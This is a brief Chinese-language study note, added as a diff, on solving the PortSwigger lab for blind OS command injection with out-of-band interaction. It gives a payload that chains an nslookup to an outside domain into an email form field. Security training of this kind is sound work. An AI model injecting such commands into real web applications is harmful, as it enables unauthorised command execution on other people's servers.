@@ -1,0 +1,11 @@
+靶场地址: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+
+=====新知识1: shell_OOB=====
+带外交互命令: nslookup 域名
+没了,连 https:// 都不需要加
+
+###
+进入靶场
+找一个邮箱的地方
+构造 x||+nslookup+域名+||qq@qq.com  -> 图1
+solved
